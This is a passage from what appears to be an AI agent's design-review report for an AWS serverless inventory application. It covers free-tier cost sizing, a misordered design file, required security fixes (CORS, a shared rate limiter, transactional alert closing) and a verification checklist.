| CloudWatch Logs                  | ~250 lines/min sustained × 5 Lambdas = 1.2 K lines/min = 1.7 M lines/day = 700 MB/day at ~400 B/line (pino JSON).                       | **RISKY.** Free-tier 5 GB ingestion + 5 GB archive. 700 MB/day exhausts archive in 7 days. **Mitigation:** ADR-7 7-day retention aligns with this; **but** the budget is consumed. See RISK-W10. |
| SNS (alarm email)                | 1 topic, 1 email sub. Email is free; SNS itself is $0.50/M publishes.                                                                   | **OK.** Alarms fire rarely.                                                                                                                                                                      |
| Secrets Manager vs SSM           | SSM Parameter Store `SecureString` is **free** ($0.05/10K API calls beyond free tier's 100K calls/month for advanced parameters).       | **OK.** R-3 mitigation credible.                                                                                                                                                                 |
| KMS                              | implicit (SSM SecureString uses an AWS-managed CMK for free).                                                                           | **OK.**                                                                                                                                                                                          |
| EventBridge                      | Not used (deferred to v2).                                                                                                              | **OK.**                                                                                                                                                                                          |
| RDS Proxy                        | Not used (proposal mentions, design drops). Proxies cost $$$, not free-tier.                                                            | **N/A.**                                                                                                                                                                                         |

**Net:** the design respects the free-tier budget narrowly. The biggest
unknown is CloudWatch log volume (RISK-W10) and the lack of sizing for
the prod stage (RISK-W11).

---

## File-structure sanity

`design.md` has the following physical ordering:

```
1. TL;DR                  (line 8)
2. System architecture    (line 19)
3. Hexagonal layering     (line 77)
4. Prisma schema          (line 302)
5. Cross-BC reaction      (line 419)
6. Concurrency            (line 528)
9. API surface            (line 664)
10. Migrations & seed     (line 708)
11. CI/CD pipeline        (line 767)
12. Observability         (line 805)
13. ADR list              (line 849)
14. File-by-file manifest (line 957)
7. Frontend architecture  (line 1018)   ← APPEARS HERE (out of order)
8. Frontend visual        (line 1403)   ← APPEARS HERE (out of order)
15. Infra design          (line 1562)
16. Out of scope          (line 1657)
```

**Does it matter for apply-phase consumption?** Yes — modestly.

- An agent that slices `design.md` by `^##` heading and iterates
  sequentially (e.g. to extract "where does the frontend code go") will
  apply frontend code **before** §15 is read. §14 ("File-by-file
  change manifest (BACKEND-ONLY portion)") explicitly says the
  frontend is appended below the marker. An unwary apply agent could
  read §14, conclude "we're done with backend", and miss §7 + §8 + §15.
- Specifically, §14.1 and §14.3 declare a backend-only manifest and
  promise that frontend arrives later. An apply agent that respects
  the section header but ignores the "appended below" annotation may
  end up writing only backend files in the first batch.
- There is **no** `<!-- end-append -->` marker until the very last
  line of §16, and no `<!-- begin-frontend -->`. A grep for the
  header tells the agent §7 and §8 exist; a slice by section range
  does not.

**Suggested fix (carried into `sdd-tasks`/`sdd-apply`):**

1. Move §7 + §8 to between §6 and §9 (the natural position).
2. Add an explicit `<!-- END-OF-BACKEND-DESIGN -->` marker after §13
   and `<!-- BEGIN-FRONTEND-DESIGN -->` before §7. Have `sdd-apply`
   agents grep for those markers.
3. Add a one-paragraph note at the top of §14 ("Frontend design
   follows in §7 below the backend-only ADR manifest; section
   numbering is preserved but file order is not").

Severity: WARNING (does not affect the design content, but does affect
the velocity of every future agent reading the file).

---

## Decision

**APPROVE-WITH-WARNINGS — but the three CRITICAL items (RISK-001,
RISK-002, RISK-003) MUST be resolved before `sdd-apply` is allowed to
write production code.** The design is otherwise sound and the
proposal + 7 spec files are coherent.

### Required actions before proceeding to `sdd-tasks`

1. **RISK-001 (CRITICAL):** Replace `bus.emit('StockAdjusted', event)`
   in §6.4 (and the corresponding step in §6.3) with a direct
   `AlertCloserPort.txCloseIfOpenAndAboveMin(tx, ...)` call **inside the
   same `prisma.$transaction`**. Add a Vitest integration test
   "manual ENTRADA above stockMin closes active alert" +
   "movement failure rolls back alert close". Update the design's
   narrative (§5.5, §6.3, §6.4) to remove the dependency on a
   cross-Lambda in-process event bus.
2. **RISK-002 (CRITICAL):** Specify CORS configuration on the HTTP
   API v2 CDK construct (§15.4 knob table). Origin must be the
   CloudFront URL for MVP. Add a Playwright e2e scenario that
   asserts a real preflight.
3. **RISK-003 (CRITICAL):** Replace `in-memory-rate-limiter.ts`
   with a Postgres-backed adapter (a `login_attempts` table works
   inside the existing stack — no new infra, no cost). Add the
   acceptance scenario "two parallel requests share the counter"
   to `specs/auth/spec.md`.
4. Address RISK-W01, RISK-W02, RISK-W04, RISK-W05 in `sdd-tasks`
   by carrying explicit work-units. The other WARNINGs may be
   resolved in follow-up changes (they are bounded).
5. RISK-N01: move §7 + §8 to between §6 and §9 in `design.md`,
   before `sdd-tasks` reads the design. (Cosmetic only — does
   not block apply content, but slows it down.)

### Out-of-band follow-ups (not blocking `sdd-tasks`)

- RISK-W03, RISK-W06, RISK-W07 (recommend explicit fix-text in
  a small amendment PR).
- RISK-S04, RISK-S05, RISK-S06, RISK-S07 (suggestion-level).
- Free-tier sizing (RISK-W10, RISK-W11) — recommend a short
  follow-up ADR.

---

## Verification

- [x] Did you read every spec file? YES — `auth`, `products`,
      `inventory`, `alerts`, `orders`, `categories`, `shared` (7/7).
- [x] Did you check the proposal against the BR inventory? YES —
      BR-1..BR-6 + BR-D1..BR-D9 each mapped in the cross-check table
      above.
- [x] Did you verify the locked decisions table? YES — D1..D7 +
      Q-P1..Q-P4 each traced to a spec + design evidence pointer.
- [x] Did you look for secret leakage in the design file? YES —
      `grep -niE "(bcrypt\.hash|ADMIN_PASSWORD|JWT_SECRET|secret)"` over
      `design.md` confirms every reference is by **name** (not value).
      No hex-encoded keys, no AWS keys, no `.env` literals, no example
      passwords. The only "secret" literals are placeholder identifiers
      (`"new"`, `"old"` in the rotation scenario; `mercadoexpress.auth`
      localStorage key; `<api-id>` and `<random>` placeholders). All
      pass.
- [x] Did you read `config.yaml` and `AGENTS.md` for context? YES.
- [x] Did you trace dependency architecture (Prisma, jose, bcrypt,
      Pino, Vue/Vite)? YES.

---

## Skill resolution

`skill_resolution: paths-injected` — no skills injected this turn; this
is the report-out pattern.
